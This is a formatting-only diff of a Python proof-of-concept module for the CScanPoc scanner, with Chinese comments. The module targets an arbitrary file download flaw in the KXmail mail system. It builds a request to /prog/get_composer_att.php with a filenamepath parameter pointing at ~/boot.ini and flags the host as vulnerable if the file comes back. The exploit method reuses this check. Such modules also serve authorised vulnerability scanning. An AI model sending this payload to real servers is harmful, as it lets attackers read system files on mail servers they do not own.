@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'KXmail_0001'  # 平台漏洞编号，留空
     name = '科信邮件系统 任意文件下载'  # 漏洞名称
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     product = 'KXmail'  # 漏洞应用名称
     product_version = 'KXmail'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '52608763-742c-4987-91c0-e1446d8d86e9'
     author = '47bwy'  # POC编写者
@@ -31,21 +33,22 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #ref http://www.wooyun.org/bugs/wooyun-2014-066892
+            # ref http://www.wooyun.org/bugs/wooyun-2014-066892
             verify_url = ('%s/prog/get_composer_att.php?att_size=1623&filenamepath'
                           '=~/boot.ini&maxatt_sign=4bc882e8c4a98ac7a97acd321aad4f'
                           '88&attach_filename=boot.ini') % self.target
 
             req = requests.get(verify_url)
             if req.status_code == 200 and 'boot.ini' in req.content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
